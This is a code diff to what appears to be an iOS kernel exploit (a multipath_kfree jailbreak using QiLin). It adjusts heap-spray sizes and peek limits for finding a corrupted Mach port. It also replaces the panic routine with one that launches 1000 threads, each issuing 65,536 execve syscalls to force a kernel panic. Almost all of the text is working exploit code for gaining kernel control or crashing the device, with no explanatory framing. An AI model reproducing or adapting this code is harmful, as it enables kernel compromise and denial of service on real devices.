@@ -12,12 +12,16 @@
 #include "multipath_kfree.h"
 #include "QiLin.h"
 
+
 #include <sys/socket.h>
 #include <sys/mman.h>
+#include <sys/syscall.h>
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
 #include <unistd.h>
+#include <pthread.h>
+
 
 uint64_t kernel_base = 0;
 
@@ -30,11 +34,29 @@ uint64_t kernel_base = 0;
 #define REFILL_PORTS_COUNT 100
 #define TOOLAZY_PORTS_COUNT 1000
 #define REFILL_USERCLIENTS_COUNT 1000
-#define MAX_PEEKS 30000
+#define MAX_PEEKS 90000
+
+typedef struct alloc_asid_arg {
+    int max_asid;
+} alloc_asid_arg;
+
+void* alloc_asid(void* arg) {
+    for(int i = 0; i < ((alloc_asid_arg*)arg)->max_asid; i++) {
+        syscall(SYS_execve, NULL, NULL, NULL);
+    }
+    return NULL;
+}
 
 void panic_now() {
-    int a;
-    mach_make_memory_entry_64(mach_task_self(),&a,0,0,0,-1);
+    pthread_t thread;
+    pthread_attr_t attr;
+    pthread_attr_init(&attr);
+    int max_asid = 65536;
+    int max_attempts = 1000;
+    alloc_asid_arg arg = { max_asid };
+    for(int attempts = 0; attempts < max_attempts; attempts++) {
+        pthread_create(&thread, &attr, &alloc_asid, &arg);
+    }
 }
 
 static void _init_port_with_empty_msg(mach_port_t port)
@@ -131,7 +153,7 @@ void jb_go(void)
     uint8_t send_buf[1024];
     
     int mp_socks[MP_SOCK_COUNT];
-    int prealloc_size = 0x660; // kalloc.4096
+    int prealloc_size = 0x1000; // kalloc.4096
     int found = 0;
     int peeks = 0;
     
@@ -141,11 +163,12 @@ void jb_go(void)
     
     for (int i = 0; i < 0x20; ++i) {
         first_ports[i] = prealloc_port(prealloc_size);
+        
     }
     
     mp_socks[0] = socket(39, SOCK_STREAM, 0);
     
-    // multipath_kfree(mp_sock, 0xffffffff41414141); for (;;) sleep(1); // uncomment for basic POC
+    // multipath_kfree(0xffffffff41414141); for (;;) sleep(1); // uncomment for basic POC
 
     for (int i = 0x20; i < FIRST_PORTS_COUNT; ++i) {
         first_ports[i] = prealloc_port(prealloc_size);
@@ -162,8 +185,6 @@ void jb_go(void)
     printf("Freeing the stuff...\n");
     multipath_kfree_nearby_self(mp_socks[0], 0x0000 + 0x7a0);
     multipath_kfree_nearby_self(mp_socks[3], 0xe000 + 0x7a0);
-
-    printf("Finding corrupt port...\n");
     for (peeks = 0; peeks < MAX_PEEKS; ++peeks) {
         for (int i = 0 ; i < FIRST_PORTS_COUNT; ++i) {
             if (_is_port_corrupt(first_ports[i])) {
@@ -181,7 +202,7 @@ void jb_go(void)
     if (peeks >= MAX_PEEKS) {
         printf("Didn't find corrupt port");
         sleep(1);
-        for (int i = 0x20; i < FIRST_PORTS_COUNT; ++i) {
+        for (int i = 0; i < FIRST_PORTS_COUNT; ++i) {
             mach_port_destroy(mach_task_self(), first_ports[i]);
         }
         panic_now();
